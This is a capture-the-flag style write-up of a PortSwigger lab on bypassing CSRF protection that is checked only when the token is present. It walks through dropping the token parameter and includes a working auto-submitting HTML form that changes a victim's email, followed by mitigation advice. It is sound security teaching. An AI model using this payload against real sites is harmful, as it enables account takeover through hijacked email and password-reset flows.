# CSRF where token validation depends on token being present

**Source:** [Port Swigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)  
**Category:** CSRF  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

## Vulnerability
This lab's email change functionality is vulnerable to CSRF.

You can log in to your own account using the following credentials: wiener:peter

## Exploitation

### Steps
1. Access the lab, log in, attempt to change the email address and intercept the request
2. The request contains the email and csrf token, with `@` encoded as `%40`:

    ```text
        email=test%40example.com&csrf=ezEbZpvDF9StmvjDtSCPnQITirNyM8Av
    ```

   Response: `302 Found`. Send it to Repeater

3. Remove the `csrf` parameter entirely:

   ```text
   email=test%40example.com
   ```

   Still returns `302 Found` - token validation is skipped when the token is absent

4. Change the email to confirm the state change:

   ```text
   email=test2%40example.com
   ```

   Also returns `302 Found`, and the email is updated after refreshing the page

5. Go to the exploit server and paste and send:

   ```html
   <html>
       <body>
           <form action="https://0abe000303feeb5180b8bc8d00ad00ac.web-security-academy.net/my-account/change-email" method="POST">
               <input type="hidden" name="email" value="hacked@evil.com" />
           </form>
           <script>
               document.forms[0].submit();
           </script>
       </body>
   </html>
   ```

   It worked, lab solved.

### Payload

```html
<html>
    <body>
        <form action="https://0abe000303feeb5180b8bc8d00ad00ac.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="hacked@evil.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Shortcut
1. Intercept POST request with CSRF token
2. Remove the `csrf` parameter - validation is skipped
3. Create auto-submit form without `csrf` field and deliver to victim

## Impact
An attacker can change the victim's email address by sending a POST request without the CSRF token. The server only validates the token when it is present, so omitting it bypasses the protection entirely. This enables account takeover through password reset functionality, since the victim's reset link would be sent to the attacker-controlled address.

## Mitigation
CSRF tokens should be validated unconditionally for all state-changing requests. A missing token must result in rejection, not in skipping validation. The application should enforce fail-closed logic, tie tokens to the user session, and additionally implement SameSite cookies and Origin/Referer checks.

## Tools
- Burp Suite
- Repeater

## Notes
- CSRF token exists but is only validated when present in the request
- Removing the token entirely bypasses validation - no token is treated as "no check needed"
- Attack delivered via auto-submitting form without a `csrf` field
- Fail-open logic is the key vulnerability